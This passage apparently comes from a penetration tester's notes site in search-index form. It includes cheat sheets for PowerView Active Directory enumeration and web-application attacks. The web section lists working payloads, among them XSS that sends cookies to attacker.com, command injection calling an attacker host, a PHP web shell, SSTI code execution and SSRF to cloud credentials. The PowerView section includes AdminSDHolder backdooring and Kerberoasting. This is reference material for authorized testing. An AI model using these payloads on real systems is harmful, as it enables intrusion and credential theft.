</ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#xiii-reporting-post-assessment","title":"XIII. Reporting &amp; Post-Assessment","text":"<ul> <li>A. All<ul> <li>Document All Findings (description, vulnerable URLs/parameters, PoC steps, screenshots/videos)</li> <li>Assess Impact and Likelihood (CVSS scoring or similar)</li> <li>Provide Clear Remediation Guidance (specific to the vulnerability and technology)</li> <li>Executive Summary for Management</li> <li>Technical Details for Development Teams</li> <li>Positive Findings (what the application does well)</li> <li>Strategic Recommendations for Overall Security Posture Improvement</li> <li>(Optional) Retest after fixes are applied.</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Compiling%20Binaries/","title":"Compiling Binaries","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Compiling%20Binaries/#linux-target","title":"Linux Target","text":"<p>Basic C <pre><code>gcc source.c -o myprog\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Compiling%20Binaries/#windows-target","title":"Windows Target","text":"<p><pre><code>sudo apt install mingw-w64\n</code></pre> Basic C Compilation 32-bit \u201cHello World\u201d (console) <pre><code>i686-w64-mingw32-gcc -O2 -Wall hello.c -o hello32.exe\n</code></pre> 64-bit \u201cHello World\u201d (console) <pre><code>x86_64-w64-mingw32-gcc -O2 -Wall hello.c -o hello64.exe\n</code></pre> Basic C++ Compilation 32-bit C++ (console) <pre><code>i686-w64-mingw32-g++ -O2 -std=c++17 -Wall hello.cpp -o hello32.exe\n</code></pre> 64-bit C++ (console) <pre><code>x86_64-w64-mingw32-g++ -O2 -std=c++17 -Wall hello.cpp -o hello64.exe\n</code></pre> Setting Windows Version Macros To target a minimum Windows version, define <code>_WIN32_WINNT</code> and <code>WINVER</code>: <pre><code># Example: target Windows 7 (0x0601)\nx86_64-w64-mingw32-gcc -D_WIN32_WINNT=0x0601 -DWINVER=0x0601 hello.c -o hello.exe\n</code></pre> Common <code>_WIN32_WINNT</code> values:</p> <ul> <li><code>0x0501</code> \u2192 Windows XP</li> <li><code>0x0600</code> \u2192 Windows Vista</li> <li><code>0x0601</code> \u2192 Windows 7    </li> <li><code>0x0602</code> \u2192 Windows 8</li> <li><code>0x0A00</code> \u2192 Windows 10</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Compiling%20Binaries/#net-excutables","title":".NET Excutables","text":"<p><pre><code>sudo apt install -y mono-devel mono-mkbundle\n</code></pre> <pre><code>sudo apt install -y gcc-mingw-w64-x86-64\nsudo apt install -y gcc-mingw-w64-i6\n</code></pre> Compile to a portable .NET EXE (IL-only) using Mono\u2019s C# compiler (<code>mcs</code>): <pre><code>mcs -out:Hello.exe Hello.cs\n</code></pre> Basic 64-bit Windows EXE <pre><code>mkbundle \\\n  --cross mono-w64 --simple \\\n  --static \\\n  --deps \\\n  -o Hello_native.exe \\\n  Hello.exe\n</code></pre> For 32-bit Windows (Win32) <pre><code>mkbundle \\\n  --cross mono-w64-i686 \\\n  --simple \\\n  --static \\\n  --deps \\\n  -o Hello_native32.exe \\\n  Hello.exe\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Compiling%20Binaries/#csproj","title":".csproj","text":"<p><pre><code>wget https://packages.microsoft.com/config/ubuntu/22.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb\nsudo dpkg -i packages-microsoft-prod.deb\nsudo apt update\nsudo apt install -y dotnet-sdk-7.0\n</code></pre> <pre><code>dotnet --info\n</code></pre> Ensure there\u2019s a <code>YourProject.csproj</code> in that directory (or a parent directory). Restore dependencies <pre><code>dotnet restore\n</code></pre> Build <pre><code>dotnet build -c Release\n</code></pre></p> <ul> <li>By default, the output goes into <code>bin/Release/&lt;TargetFramework&gt;/</code></li> <li>If you want to target a specific runtime (e.g. Windows), use: Target runtime <pre><code>dotnet publish -c Release -r win-x64 --self-contained false\n</code></pre></li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Misc/","title":"Misc","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Misc/#how-to-passthrugh-usb-devices-virtualbox","title":"How to passthrugh USB devices VirtualBox","text":"<ol> <li>Extension pack and VirtualBox versions must match. The former can be found via File &gt; Preferences &gt; Extensions and the latter via Help &gt; About.</li> <li>USB Controller must be enabled in the VM configuration options.</li> <li>VBox Guest Additions must be installed on the guest VM. With the VM running, click Devices &gt; Insert Guest Additions CD Image and run the VBoxWindowsAdditions executable.</li> <li>The user running VirtualBox must be in the vboxusers group. At the command line, run <code>groups</code> to see what groups you are a member of. If vboxusers isn't in the list, run <code>sudo gpasswd -a $USER vboxusers</code> to add yourself then REBOOT.</li> <li>At least one filter must be set up under Devices &gt; USB &gt; USB Settings. Clicking the top icon on the right (USB plug with solid blue dot) will create a 'universal' filter for any device. When the VM is running, you should now see a list when you go to Devices &gt; USB that allows you to select devices to connect.</li> </ol>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Misc/#new-note-structure","title":"New note structure","text":"<p>Add cleanup considerations for EVERYTHING Add detection considerations for EVERYTHING</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Passive%20Network%20Recon/","title":"Passive Network Recon","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Passive%20Network%20Recon/#host-discovery","title":"Host discovery","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Passive%20Network%20Recon/#dhcp","title":"DHCP","text":"<p>dhcpdump <pre><code>sudo dhcpdump -i eth0\n</code></pre> zeek <pre><code>sudo zeek -i eth0 local\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Passive%20Network%20Recon/#arp","title":"ARP","text":"<p>tcpdump <pre><code>sudo tcpdump -n -i eth0 arp\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/PowerView/","title":"PowerView","text":"<p>Load, help, and creds - Import PowerView into the current session. <pre><code>Import-Module .\\PowerView.ps1\n</code></pre> - Show detailed help for a function. <pre><code>Get-Help Get-DomainUser -Detailed\n</code></pre> - Build an alternate credential object for any PowerView function. <pre><code>$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a',$SecPassword)\n</code></pre> - Test using alternate creds with a domain query. <pre><code>Get-DomainUser -Credential $Cred\n</code></pre></p> <p>Domain, forest, DCs, sites - Query info about the current domain. <pre><code>Get-Domain\n</code></pre> - Query info about a specified (child) domain. <pre><code>Get-Domain -Domain child.corp.local\n</code></pre> - List domain controllers for the current domain. <pre><code>Get-DomainController\n</code></pre> - Get forest-level information. <pre><code>Get-Forest\n</code></pre> - List all domains in the forest. <pre><code>Get-ForestDomain\n</code></pre> - List forest trusts. <pre><code>Get-ForestTrust\n</code></pre> - List domain trusts (like nltest /trusted_domains). <pre><code>Get-DomainTrust\n</code></pre> - Recursively map reachable domain trusts. <pre><code>Get-DomainTrustMapping\n</code></pre> - Enumerate AD sites. <pre><code>Get-DomainSite\n</code></pre> - Enumerate AD subnets. <pre><code>Get-DomainSubnet\n</code></pre> - List global catalog servers in the forest. <pre><code>Get-ForestGlobalCatalog\n</code></pre></p> <p>Policy (password/Kerberos) - Read Kerberos policy from domain policy. <pre><code>(Get-DomainPolicy -Domain corp.local).KerberosPolicy\n</code></pre> - Read password/lockout policy (SystemAccess) from domain policy. <pre><code>(Get-DomainPolicy -Domain corp.local).SystemAccess\n</code></pre></p> <p>Users (filters, UAC, SPN/AS-REP) - Enumerate users with useful props (UPN, enabled, last logon). <pre><code>Get-DomainUser -Properties samaccountname,UserPrincipalName,Enabled,lastlogontimestamp\n</code></pre> - Users with passwords not changed in &gt;1 year. <pre><code>$Date=(Get-Date).AddYears(-1).ToFileTime(); Get-DomainUser -LDAPFilter \"(pwdlastset&lt;=$Date)\" -Properties samaccountname,pwdlastset\n</code></pre> - All enabled users (DNs). <pre><code>Get-DomainUser -LDAPFilter \"(!userAccountControl:1.2.840.113556.1.4.803:=2)\" -Properties distinguishedname\n</code></pre> - Enabled users via UAC helper. <pre><code>Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname\n</code></pre> - All disabled users (LDAP filter). <pre><code>Get-DomainUser -LDAPFilter \"(useraccountcontrol:1.2.840.113556.1.4.803:=2)\"\n</code></pre> - All disabled users (UAC helper). <pre><code>Get-DomainUser -UACFilter ACCOUNTDISABLE\n</code></pre> - Users requiring smart card auth (LDAP filter). <pre><code>Get-DomainUser -LDAPFilter \"(useraccountcontrol:1.2.840.113556.1.4.803:=262144)\"\n</code></pre> - Users requiring smart card (UAC helper). <pre><code>Get-DomainUser -UACFilter SMARTCARD_REQUIRED\n</code></pre> - Users NOT requiring smart card (list samaccountname only). <pre><code>Get-DomainUser -LDAPFilter \"(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)\" -Properties samaccountname\n</code></pre> - Service accounts (users with SPNs). <pre><code>Get-DomainUser -SPN\n</code></pre> - AS-REP roastable users (no Kerberos preauth). <pre><code>Get-DomainUser -PreauthNotRequired\n</code></pre> - AS-REP roastable via UAC helper. <pre><code>Get-DomainUser -UACFilter DONT_REQ_PREAUTH\n</code></pre> - Mix identity types (SID, DN, GUID, name) for user lookup. <pre><code>'S-1-5-21-890171859-3433809279-3366196753-1114','CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff\n</code></pre> - Users with sidHistory populated. <pre><code>Get-DomainUser -LDAPFilter '(sidHistory=*)' -Properties samaccountname,sidHistory\n</code></pre> - Service accounts that are (or were) in Domain Admins. <pre><code>Get-DomainUser -SPN | ? {$_.memberOf -match 'Domain Admins'}\n</code></pre></p> <p>Groups and membership - List groups with \u201cadmin\u201d in the name. <pre><code>Get-DomainGroup -Identity *admin* -Properties name,distinguishedname\n</code></pre> - List protected (AdminSDHolder) groups. <pre><code>Get-DomainGroup -AdminCount -Properties name\n</code></pre> - List groups that don\u2019t have a global scope. <pre><code>Get-DomainGroup -GroupScope NotGlobal -Properties name\n</code></pre> - List all groups a user/group effectively belongs to (tokenGroups). <pre><code>Get-DomainGroup -MemberIdentity jdoe\n</code></pre> - Same as above with a DN identity. <pre><code>Get-DomainGroup -MemberIdentity \"CN=dfm,CN=Users,DC=testlab,DC=local\"\n</code></pre> - Recursively enumerate group members of Domain Admins. <pre><code>Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse\n</code></pre></p> <p>Foreign users/groups (cross-domain) - Find users from foreign domains present in this domain. <pre><code>Get-DomainForeignUser\n</code></pre> - Find groups in target domain that have foreign members. <pre><code>Get-DomainForeignGroupMember -Domain target.domain.com\n</code></pre> - List foreignSecurityPrincipals from the GC (for SID/DN correlation). <pre><code>Get-DomainObject -Properties objectsid,distinguishedname -SearchBase \"GC://corp.local\" -LDAPFilter '(objectclass=foreignSecurityPrincipal)'\n</code></pre></p> <p>Computers (targeting, delegation) - Inventory computers with helpful props. <pre><code>Get-DomainComputer -Properties name,dnshostname,operatingsystem,lastlogontimestamp\n</code></pre> - Filter by OS for servers. <pre><code>Get-DomainComputer -OperatingSystem \"*Server*\" -Properties name,operatingsystem\n</code></pre> - Computers allowing unconstrained delegation. <pre><code>Get-DomainComputer -Unconstrained\n</code></pre> - Computers trusted to authenticate for others (constrained delegation). <pre><code>Get-DomainComputer -TrustedToAuth\n</code></pre> - Computers with specific SPNs (e.g., SQL). <pre><code>Get-DomainComputer -SPN *SQL* -Properties name,serviceprincipalname\n</code></pre> - List computers from a specific OU. <pre><code>Get-DomainComputer -SearchBase \"LDAP://OU=Servers,DC=corp,DC=local\" -Properties dnshostname\n</code></pre></p> <p>Sessions, local groups, shares (who/where, not process list) - Enumerate SMB sessions on a remote host. <pre><code>Get-NetSession -ComputerName FS01.corp.local\n</code></pre> - Enumerate logged-on users on a host. <pre><code>Get-NetLoggedOn -ComputerName WS01.corp.local\n</code></pre> - Enumerate current RDP sessions (and source IPs). <pre><code>Get-NetRDPSession -ComputerName WS01.corp.local\n</code></pre> - List local groups on a host. <pre><code>Get-NetLocalGroup -ComputerName WS01\n</code></pre> - List members of a local group (default WinNT provider). <pre><code>Get-NetLocalGroupMember -ComputerName WS01 -GroupName \"Administrators\"\n</code></pre> - Faster local group member enumeration via Win32 API. <pre><code>Get-NetLocalGroupMember -Method API -ComputerName SERVER.domain.local\n</code></pre> - Enumerate shares on a host. <pre><code>Get-NetShare -ComputerName SQL01\n</code></pre></p> <p>User hunting (old Invoke-UserHunter) - Show all user locations across domain (be noisy). <pre><code>Find-DomainUserLocation -ShowAll\n</code></pre> - Focus on unconstrained delegation computers and show users. <pre><code>Find-DomainUserLocation -ComputerUnconstrained -ShowAll\n</code></pre> - Hunt for admin users who allow delegation on unconstrained hosts. <pre><code>Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation\n</code></pre> - Hunt specific user and check if you have local admin where found. <pre><code>Find-DomainUserLocation -UserIdentity \"jdoe\" -CheckAccess\n</code></pre> - Get logged-on users for all \u201cserver\u201d OUs in a domain. <pre><code>Get-DomainOU -Identity *server* -Domain corp.local | % { Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | % { Get-NetLoggedOn -ComputerName $_.dnshostname } }\n</code></pre></p> <p>Shares and file discovery - Enumerate open shares domain-wide. <pre><code>Find-DomainShare\n</code></pre> - Enumerate only shares you can read. <pre><code>Find-DomainShare -CheckShareAccess\n</code></pre> - Search domain shares for interesting files (old Invoke-FileFinder). <pre><code>Find-InterestingDomainShareFile -Domain CORP\n</code></pre> - Same, with alternate credentials. <pre><code>$Password=\"PASSWORD\"|ConvertTo-SecureString -AsPlainText -Force; $Credential=New-Object System.Management.Automation.PSCredential(\"CORP\\user\",$Password); Find-InterestingDomainShareFile -Domain CORP -Credential $Credential\n</code></pre> - Recursively search a specific UNC path for keywords, Office docs, and last-access time. <pre><code>Find-InterestingFile -Path \\\\SERVER\\Share -Include password,creds,secret -OfficeDocs -LastAccessTime (Get-Date).AddDays(-7)\n</code></pre></p> <p>GPOs, GP links, access mapping - List all GPOs in the domain. <pre><code>Get-DomainGPO\n</code></pre> - List OUs and their GPO links. <pre><code>Get-DomainOU -GPLink | Select-Object Name,gplink\n</code></pre> - List policies applied to a specific computer. <pre><code>Get-DomainGPO -ComputerIdentity WS01.corp.local\n</code></pre> - Map where a user/group has local group rights via GPO (old Find-GPOLocation). <pre><code>Get-DomainGPOUserLocalGroupMapping -Identity \"CORP\\Helpdesk\"\n</code></pre> - Check RDP group mapping for a user in a domain. <pre><code>Get-DomainGPOUserLocalGroupMapping -Identity \"CORP\\user\" -Domain corp.local -LocalGroup RDP\n</code></pre> - Export a CSV of GPO mappings with flattened computer arrays. <pre><code>Get-DomainGPOUserLocalGroupMapping | % { $_.computers = ($_.computers -join \", \"); $_ } | Export-Csv -NoTypeInformation gpo_map.csv\n</code></pre></p> <p>Delegation reconnaissance - Users with constrained delegation configured. <pre><code>Get-DomainUser -TrustedToAuth\n</code></pre> - Computers with constrained delegation configured. <pre><code>Get-DomainComputer -TrustedToAuth\n</code></pre> - Admin-protected users who are allowed to be delegated (interesting). <pre><code>Get-DomainUser -AllowDelegation -AdminCount\n</code></pre></p> <p>ACLs, DCSync rights, AdminSDHolder, backdooring - Enumerate who has rights over a target object (resolve GUIDs). <pre><code>Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local\n</code></pre> - Grant \u201cwill\u201d the right to reset \u201cmatt\u201d\u2019s password. <pre><code>Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose\n</code></pre> - Read AdminSDHolder permissions (resolve GUIDs). <pre><code>Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs\n</code></pre> - Backdoor AdminSDHolder to grant \u201cmatt\u201d full rights to protected objects. <pre><code>Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All\n</code></pre> - Identify principals with replication (DCSync) or full control (domain DN path). <pre><code>Get-DomainObjectAcl \"dc=dev,dc=testlab,dc=local\" -ResolveGUIDs | ? { ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') }\n</code></pre> - Alternative DCSync check using Get-ObjectACL alias/function. <pre><code>Get-ObjectACL \"DC=testlab,DC=local\" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get') }\n</code></pre></p> <p>GPP and GPP-linked computers - Recover any stored Group Policy Preferences passwords (legacy). <pre><code>Get-GPPPassword\n</code></pre> - Resolve all computer DNS hostnames where a given GPP/GPO applies by GUID. <pre><code>Get-DomainOU -GPLink '&lt;GPP_GUID&gt;' | % { Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname }\n</code></pre></p> <p>Interesting ACLs and shadow admins - Find interesting domain ACLs (write/owner/DACL rights) and resolve GUIDs. <pre><code>Find-InterestingDomainAcl -ResolveGUIDs\n</code></pre> - Flag GPOs where \u201cuser\u201d SIDs (&gt;1000) have modification/control rights. <pre><code>Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner') }\n</code></pre></p> <p>OU, file servers, DNS - List organizational units. <pre><code>Get-DomainOU\n</code></pre> - Find likely file servers based on user home/profile/script paths. <pre><code>Get-DomainFileServer\n</code></pre> - Enumerate DNS records for a zone (if DNS partition accessible). <pre><code>Get-DomainDNSRecord -Zone corp.local\n</code></pre></p> <p>Trust-aware foreign membership walk - Pull foreignSecurityPrincipal DNs from GC for later correlation. <pre><code>$ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase \"GC://testlab.local\" -LDAPFilter '(objectclass=foreignSecurityPrincipal)' | ? {$_.objectsid -match '^S-1-5-.*-[1-9]\\d{2,}$'} | Select-Object -ExpandProperty distinguishedname\n</code></pre> - For each referenced domain, enumerate domain-local groups with those members. <pre><code>$Domains=@{}; ForEach($ForeignUser in $ForeignUsers){ $ForeignUserDomain=$ForeignUser.Substring($ForeignUser.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'; if(-not $Domains[$ForeignUserDomain]){ $Domains[$ForeignUserDomain]=$True; $Filter=\"(|(member=\"+($ForeignUsers -join \")(member=\")+\"))\"; Get-DomainGroup -Domain $ForeignUserDomain -Scope DomainLocal -LDAPFilter $Filter -Properties distinguishedname,member } } | fl\n</code></pre></p> <p>User impersonation helpers (STA) - Temporarily impersonate a different credential (runas /netonly-like). <pre><code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a',$SecPassword); Invoke-UserImpersonation -Credential $Cred\n</code></pre> - Revert impersonation back to self. <pre><code>Invoke-RevertToSelf\n</code></pre></p> <p>Object outliers, setters, ownership - Detect outlier properties across computer objects. <pre><code>Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier\n</code></pre> - Set arbitrary attributes on an AD object. <pre><code>Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\\\EVIL\\program.exe'} -Verbose\n</code></pre> - Take or set ownership of an AD object. <pre><code>Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y\n</code></pre></p> <p>Kerberoasting and AS-REP roast - Kerberoast using defaults (prints TGS hashes). <pre><code>Invoke-Kerberoast\n</code></pre> - Kerberoast a specific account, Hashcat format. <pre><code>Invoke-Kerberoast -Identity \"svc_sql\" -OutputFormat Hashcat\n</code></pre> - Kerberoast scoped to a specific OU/SearchBase. <pre><code>Invoke-Kerberoast -SearchBase \"LDAP://OU=secret,DC=testlab,DC=local\" -OutputFormat Hashcat\n</code></pre> - List AS-REP roastable users (no preauth). <pre><code>Get-DomainUser -PreauthNotRequired | Select-Object samaccountname\n</code></pre> - Request AS-REP roast for a specific user. <pre><code>Invoke-ASREPRoast -UserName jdoe -Verbose\n</code></pre></p> <p>Local admin reachability - Threaded probe to find where you\u2019re local admin (SMB/RPC). <pre><code>Find-LocalAdminAccess\n</code></pre> - Test admin access to a single host. <pre><code>Test-AdminAccess -ComputerName WS01\n</code></pre></p> <p>Turn short names into FQDNs via GC - Resolve bare hostnames to FQDNs using the global catalog. <pre><code>gc .\\computers.txt | % { Get-DomainComputer -SearchBase \"GC://GLOBAL.CATALOG\" -LDAP \"(name=$_) \" -Properties dnshostname }\n</code></pre></p> <p>Data export/import - Export objects to XML for offline analysis. <pre><code>Get-DomainUser | Export-Clixml .\\users.xml\n</code></pre> - Re-import exported PowerView objects. <pre><code>$Users = Import-Clixml .\\users.xml\n</code></pre></p> <p>Password attribute probe (rare, but occasionally exposed) - Dump userPassword attribute (if present) and render ASCII. <pre><code>$FormatEnumerationLimit=-1; Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % { Add-Member -InputObject $_ NoteProperty 'Password' \"$([System.Text.Encoding]::ASCII.GetString($_.userPassword))\" -PassThru } | fl\n</code></pre></p> <p>Common pipelines and counts - Count total domain users quickly. <pre><code>(Get-DomainUser).Count\n</code></pre> - Find non-empty user description fields. <pre><code>Get-DomainUser -Properties samaccountname,description | ? { $_.description -ne $null }\n</code></pre></p> <p>Process enumeration (not a PowerView function) PowerView 3.x has no Get-NetProcess; use native remoting/WMI/CIM: - Get processes on a remote host via WinRM (PowerShell remoting). <pre><code>Invoke-Command -ComputerName WS01 -ScriptBlock { Get-Process } -Credential $Cred\n</code></pre> - Query processes via CIM (WSMan) on a remote host. <pre><code>Get-CimInstance Win32_Process -ComputerName WS01 -Credential $Cred\n</code></pre> - Query processes via legacy WMI (DCOM) on a remote host. <pre><code>Get-WmiObject Win32_Process -ComputerName WS01 -Credential $Cred\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/SQLMap/","title":"SQLMap","text":"<p>Useful flags: <pre><code>--batch will answer the default the questons automatically\n--level\n--risk\n-T\n-D\n--dump\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/","title":"WebApp","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#reconnaissance","title":"RECONNAISSANCE","text":"<p>Present on: All web applications</p> <p>Manual: Browser dev tools, view source, directory guessing Automated: <pre><code>subfinder -d target.com | httpx -silent\nffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ\nnuclei -u target.com -t technologies/\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#authentication-bypass","title":"AUTHENTICATION BYPASS","text":"<p>Present when: Poor auth implementation, weak validation logic</p> <p>Manual: Try default creds, manipulate login flow, check session handling Automated: <pre><code>hydra -L users.txt -P pass.txt target.com http-post-form\nffuf -w creds.txt -u target.com/login -X POST -d \"user=FUZZ&amp;pass=FUZZ\"\n</code></pre></p> <p>Exploit: <pre><code>' OR 1=1--\nadmin'--\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#sql-injection","title":"SQL INJECTION","text":"<p>Present when: User input directly concatenated into SQL queries Detailed cheatsheet: SQL Injection</p> <p>Manual: Add <code>'</code> to parameters, observe errors, test time delays Automated: <pre><code>sqlmap -u \"target.com/page?id=1\" --batch --dbs\nghauri -u \"target.com/page?id=1\"\n</code></pre></p> <p>Exploit: <pre><code># Detection\n' OR SLEEP(5)--\n' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--\n\n# Extraction\n' UNION SELECT 1,version(),database()--\n' UNION SELECT 1,load_file('/etc/passwd'),3--\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#xss","title":"XSS","text":"<p>Present when: User input reflected in HTML without proper encoding Also see Cross-Site Scripting (XSS) Manual: Insert <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> in all inputs, check response Automated: <pre><code>xsser --url=\"target.com/search?q=\" -p\nnuclei -u target.com -t xss/\ndalfox url target.com\n</code></pre></p> <p>Exploit: <pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n&lt;img src=x onerror=fetch('//attacker.com/'+document.cookie)&gt;\n&lt;svg onload=location='//attacker.com/?'+localStorage.getItem('token')&gt;\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#command-injection","title":"COMMAND INJECTION","text":"<p>Present when: User input passed to system commands without sanitization Also see: Command Injection Manual: Test with <code>;</code>, <code>&amp;&amp;</code>, <code>|</code> followed by commands like <code>whoami</code> Automated: <pre><code>commix --url=\"target.com/ping?host=127.0.0.1\"\nnuclei -u target.com -t command-injection/\n</code></pre></p> <p>Exploit: <pre><code>; whoami\n&amp;&amp; id\n| cat /etc/passwd\n`curl attacker.com/$(whoami)`\n$(nslookup whoami.attacker.com)\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#file-upload","title":"FILE UPLOAD","text":"<p>Present when: File uploads lack proper validation and execution prevention Also see: Insecure File Uploads Manual: Upload various file types, check execution in upload directory Automated: <pre><code>fuxploider --url target.com/upload\nnuclei -u target.com -t file-upload/\n</code></pre></p> <p>Exploit: <pre><code># Shell upload\nshell.php: &lt;?php system($_GET['cmd']); ?&gt;\n\n# Bypass techniques\nshell.php%00.jpg\nshell.Php\nshell.phtml\nGIF89a;&lt;?php system($_GET['cmd']);?&gt;\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#ssrf","title":"SSRF","text":"<p>Present when: Application makes requests to user-controlled URLs</p> <p>Manual: Replace URLs with internal IPs, cloud metadata endpoints Automated: <pre><code>ssrfmap -r request.txt -p url -m readfiles\nnuclei -u target.com -t ssrf/\n</code></pre></p> <p>Exploit: <pre><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://127.0.0.1:8080/admin\nfile:///etc/passwd\ngopher://127.0.0.1:6379/_SET test 1\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#ssti","title":"SSTI","text":"<p>Present when: User input embedded in template engines without sandboxing Also see: Server-Side Template Injection (SSTI) Manual: Test with <code>{{7*7}}</code>, <code>${7*7}</code>, observe if calculation occurs Automated: <pre><code>tplmap -u \"target.com/page?name=test\"\nnuclei -u target.com -t ssti/\n</code></pre></p> <p>Exploit: <pre><code># Jinja2\n{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n\n# Twig\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}\n\n# Freemarker\n&lt;#assign ex=\"freemarker.template.utility.Execute\"?new()&gt; ${ ex(\"id\") }\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#path-traversallfi","title":"PATH TRAVERSAL/LFI","text":"<p>Present when: File paths constructed from user input without validation Also see: Local File Inclusion (LFI) Manual: Replace filenames with <code>../../../etc/passwd</code>, observe responses Automated: <pre><code>dotdotpwn -m http -h target.com -x 8080 -f /etc/passwd\nnuclei -u target.com -t lfi/\n</code></pre></p> <p>Exploit: <pre><code>../../../etc/passwd\n....//....//....//etc/passwd\nphp://filter/convert.base64-encode/resource=config.php\nphp://input (with POST: &lt;?php system($_GET['cmd']);?&gt;)\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#insecure-deserialization","title":"INSECURE DESERIALIZATION","text":"<p>Present when: Untrusted serialized objects are deserialized</p> <p>Manual: Look for base64/hex blobs in cookies, \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440s; decode and analyze Automated: <pre><code>ysoserial -p CommonsCollections1 -c 'id'\nphpggc -l # List gadgets\n</code></pre></p> <p>Exploit: <pre><code># Java\njava -jar ysoserial.jar CommonsCollections1 'id' | base64\n\n# PHP\nphpggc Laravel/RCE1 system id | base64\n\n# .NET\nysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c \"calc\"\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#idor","title":"IDOR","text":"<p>Present when: Object IDs in URLs/parameters lack proper authorization checks Also see: Insecure Direct Object Reference (IDOR) Manual: Change numeric IDs, UUIDs, usernames in parameters Automated: <pre><code>ffuf -w numbers.txt -u target.com/user/FUZZ -fc 404\nauthz0 -u target.com -H \"Cookie: session=abc\"\n</code></pre></p> <p>Exploit: <pre><code>/user/profile?id=1 \u2192 id=2\n/api/document/ABC123 \u2192 